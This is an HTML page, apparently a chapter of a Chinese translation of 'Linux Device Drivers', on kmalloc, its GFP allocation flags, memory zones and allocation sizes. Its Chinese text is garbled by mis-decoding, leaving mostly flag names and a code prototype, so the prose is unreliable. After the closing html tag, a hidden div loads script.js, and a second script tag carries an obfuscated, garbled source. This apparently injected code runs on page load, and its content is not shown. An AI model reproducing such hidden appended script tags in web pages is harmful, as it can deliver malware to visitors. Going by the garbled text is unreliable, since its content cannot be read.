<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>&#160;8&#160;&#160;ڴ-Linux豸棨İ棩- - </title>
<meta name="description" content="- - " />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="index.html" title="Linux 豸 Edition 3">
<link rel="prev" href="ch07s07.html" title="7.7.&#160;ٲο">
<link rel="next" href="ch08s02.html" title="8.2.&#160;󱸻">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">&#160;8&#160;&#160;ڴ</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch07s07.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch08s02.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="chapter" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title">
<a name="AllocatingMemory.chap"></a>&#160;8&#160;&#160;ڴ</h2></div></div></div>
<div class="toc">
<p><b>Ŀ¼</b></p>
<dl>
<dt><span class="sect1"><a href="ch08.html#TheRealStoryofkmalloc.sect">8.1. kmalloc ʵ</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch08.html#TheFlagsArgument.sect">8.1.1. flags </a></span></dt>
<dt><span class="sect2"><a href="ch08.html#TheSizeArgument.sect">8.1.2.  size </a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch08s02.html">8.2. 󱸻</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch08s02.html#AscullBasedontheSlabCachesscullc.sect">8.2.1. һ Slab  scull: scullc</a></span></dt>
<dt><span class="sect2"><a href="ch08s02.html#MemoryPools.sect">8.2.2. ڴ</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch08s03.html">8.3. get_free_page </a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch08s03.html#AscullUsingWholePagesscullp.sect">8.3.1. һʹҳ scull: scullp</a></span></dt>
<dt><span class="sect2"><a href="ch08s03.html#TheallocpagesInterface.sect">8.3.2. alloc_pages ӿ</a></span></dt>
<dt><span class="sect2"><a href="ch08s03.html#vallocandFriends.sect">8.3.3. vmalloc  </a></span></dt>
<dt><span class="sect2"><a href="ch08s03.html#AscullUsingVirtualAddressesscullv.sect">8.3.4. һʹַ scull : scullv</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch08s04.html">8.4. ÿ-CPU ı</a></span></dt>
<dt><span class="sect1"><a href="ch08s05.html">8.5. ô</a></span></dt>
<dd><dl><dt><span class="sect2"><a href="ch08s05.html#AcquiringaDedicatedBufferatBootTime.sect">8.5.1. ʱרõĻ</a></span></dt></dl></dd>
<dt><span class="sect1"><a href="ch08s06.html">8.6. ٲο</a></span></dt>
</dl>
</div>
<p>, Ѿʹ kmalloc  kfree ͷڴ. Linux ںṩ˸ḻһڴԭ, . ڱ, ǲ鿴豸ʹڴŻϵͳڴԴ. ǲ漰ͬϵʵιڴ. ģ鲻ǣڷֶ, ҳ, Ϊںṩһͳһڴӿ. , ǲڱڴڲϸ, Ƴ 15 .</p>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="TheRealStoryofkmalloc.sect"></a>8.1.&#160;kmalloc ʵ</h2></div></div></div>
<p>kmalloc һĹ߲ѧϰΪ malloc . ()Ҳõڴ; Ȼԭ.<sup>[<a name="id450180" href="#ftn.id450180">28</a>]</sup> Ҳڴ. 漸, ϸ kmalloc, ܱȽǺҪ۵ڴ似.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="TheFlagsArgument.sect"></a>8.1.1.&#160;flags </h3></div></div></div>
<p>ס kmalloc ԭ:</p>
<pre class="programlisting">
#include &lt;linux/slab.h&gt; 
void *kmalloc(size_t size, int flags); 
</pre>
<p> kmalloc ĵһҪĿĴС.  2 , ־, ǳȤ, ΪԼʽ kmalloc Ϊ.</p>
<p>һʹõı־, GFP_KERNEL, ˼((ڲͨ __get_free_pages ,  GFP_ ǰ׺Դ) ں˿ռĽ̶е. 仰˵, ζŵúǴһִһϵͳ. ʹ GFP_KENRL ζ kmalloc ܹʹǰڴ˯ȴһҳ. һʹ GFP_KERNEL ڴĺ, , ǿĲҲԭ. ǰ˯, ں˲ȡȷĶλһЩڴ, ͨˢ»浽̻߽ȥһû̵ڴ.</p>
<p>GFP_KERNEL һֱʹõȷ־; ʱ kmalloc һ̵ĵⲿ. , ĵÿܷжϴ, tasklet, ں˶ʱ. , ǰ̲ӦΪ˯, Ӧʹһ GFP_ATOMIC ־. ںͼһЩҳԱԭӵķ. ʹ GFP_ATOMIC ʱ, kmalloc ܹʹһҳ. һҳ, , ʧ.</p>
<p> GFP_KERNEL  GFP_ATOMIC ı־,  2 Ǵ󲿷豸Ҫ. еı־ &lt;linux/gfp.h&gt;, ÿ־һ˫»ǰ׺,  __GFP_DMA. , зŴʹõı־; Щȱǰ׺ʱΪȼ. ߰:</p>
<div class="variablelist"><dl>
<dt><span class="term">GFP_ATOMIC <span></span></span></dt>
<dd><p>жϴͽ֮зڴ. Ӳ˯.</p></dd>
<dt><span class="term">GFP_KERNEL <span></span></span></dt>
<dd><p>ںڴ. ˯.</p></dd>
<dt><span class="term">GFP_USER <span></span></span></dt>
<dd><p>Ϊûռҳڴ; ˯.</p></dd>
<dt><span class="term">GFP_HIGHUSER <span></span></span></dt>
<dd><p>ͬ GFP_USER, ǴӸ߶ڴ, . ߶ڴһӽ.</p></dd>
<dt><span class="term">GFP_NOIO <span></span></span></dt>
<dd></dd>
<dt><span class="term">GFP_NOFS <span></span></span></dt>
<dd><p>־ͬ GFP_KERNEL, Ƶں. һ GFP_NOFS 䲻κļϵͳ,  GFP_NOIO κ I/O ʼ. Ҫļϵͳڴ, һ˯, ǵݹļϵͳûһע.</p></dd>
</dl></div>
<p>гЩ־б־Ϊ, Щ־ıЩν:</p>
<div class="variablelist"><dl>
<dt><span class="term">__GFP_DMA <span></span></span></dt>
<dd><p>־Ҫܹ DMA ڴ. ȷеĺƽ̨Ĳ½.</p></dd>
<dt><span class="term">__GFP_HIGHMEM <span></span></span></dt>
<dd><p>־ָʾڴλڸ߶ڴ.</p></dd>
<dt><span class="term">__GFP_COLD <span></span></span></dt>
<dd><p>, ڴ""ҳ -- ڴҵҳ. ෴, ־һ""ҳ, һʱûʹ. Էҳ DMA õ, ʱڴгõ. һĶη DMA ۿ"ֱڴȡ"һڵ 1 .</p></dd>
<dt><span class="term">__GFP_NOWARN <span></span></span></dt>
<dd><p>õı־ֹں(ʹ printk ), һ޷.</p></dd>
<dt><span class="term">__GFP_HIGH <span></span></span></dt>
<dd><p>־ʶһȼ, ں˱״ڴҳ.</p></dd>
<dt><span class="term">__GFP_REPEAT<span></span></span></dt>
<dd></dd>
<dt><span class="term">__GFP_NOFAIL<span></span></span></dt>
<dd></dd>
<dt><span class="term">__GFP_NORETRY <span></span></span></dt>
<dd><p>Щ־޸ķζ, һ. __GFP_REPEAT ˼" Щ" ͨظ -- ǷȻʧ. __GFP_NOFAIL ־߷Ҫʧ; ŬҪ. ʹ __GFP_NOFAIL ǿҲƼ; ܴӲЧһ豸ʹ. , __GFP_NORETRY ֪òڴ.</p></dd>
</dl></div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Memoryzones.sect"></a>8.1.1.1.&#160;ڴ</h4></div></div></div>
<p>__GFP_DMA  __GFP_HIGHMEM һƽ̨صĽɫ, ܶƽ̨ǵʹöЧ.</p>
<p>Linux ں֪ 3 ڴ: DMA-ܹ ڴ, ͨڴ, ͸߶ڴ. ͨط䶼ͨ, ЩոἰλһӲͬڴ. 뷨, ÿ֪ڴ淶Χ(Ϊе RAM ͬ)ļƽ̨.</p>
<p>DMA-ܹ ڴλһȵĵַΧ,  DMA ȡ. ڴ󲿷ֵĽȫƽ̨, еڴ涼.  x86, DMA  RAM ǰ 16 MB, ﴫͳ ISA 豸Խ DMA; PCI 豸û.</p>
<p>߶ڴһ 32-λ ƽ̨ȡ(Ե)ڴ. ûһӳڴ޷ֱӴں˴ȡͨʹ. ʹôڴ, , ܹʹø߶ڴڴϵͳйĸ. ߶ڴιԼʹ 1 µ"߶˺͵Ͷڴ"һ.</p>
<p>ۺʱһҳһڴ, ں˶һܹʹõڴб.  __GFP_DMA ָ, ֻ DMA : ڵͶûڴ, ʧ. ûرı־ȡ, ͨ DMA ڴ涼;  __GFP_HIGHMEM , е 3 һеҳ. (ע, , kmalloc  ܷ߶ڴ.)</p>
<p>ڷͳһڴȡ(NUMA)ϵͳϸӸ. ΪһͨõĹ, ͼλзĴıصڴ, мıΪ.</p>
<p>ڴĻ mm/page_alloc.c ʵ, ڴĳʼƽ̨ضļ,  arch Ŀ¼ mm/init.c. ǽڵ 15 ٴЩ.</p>
</div>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="TheSizeArgument.sect"></a>8.1.2.&#160; size </h3></div></div></div>
<p>ں˹ϵͳڴ, ЩڴֻҳСĿʹ. , kmalloc ǳͬһ͵ûռ malloc ʵ. һ򵥵, ѵķ似ܺܿ鷳; ڽҳ߽ʱ. , ںʹһҳķ似õϵͳ RAM.</p>
<p>Linux ڴͨһ׹̶Сڴ. , һ㹻ĶĳӲҽڴݽ. ڴǷǳ, ϸͨȫ豸д߶Ȥ.</p>
<p>Ȼ, Ӧסһ, ںֻܷĳЩԤ, ̶Сֽ. һڴ, ܵõ΢,  2 . ͬ, ԱӦס kmalloc ܹС 32  64 ֽ, ϵͳϵʹõҳС.</p>
<p>kmalloc ܹڴĴСһ. ϵںѡ仯. ĴҪȫֲ, ָԷκδ 128 KB. Ҫڼ KB, , и kmalloc õķڴ, ڱº.</p>
</div>
</div>
<div class="footnotes">
<br><hr width="100" align="left">
<div class="footnote"><p><sup>[<a name="ftn.id450180" href="#id450180">28</a>] </sup>֮, ⰵӦȷܱ¶ûռд豸ڴ; , ðսӦܵϢ͸¶ȥ.</p></div>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch07s07.html">һҳ</a>&#160;</td>
<td width="20%" align="center">&#160;</td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch08s02.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">7.7.&#160;ٲο&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;8.2.&#160;󱸻</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>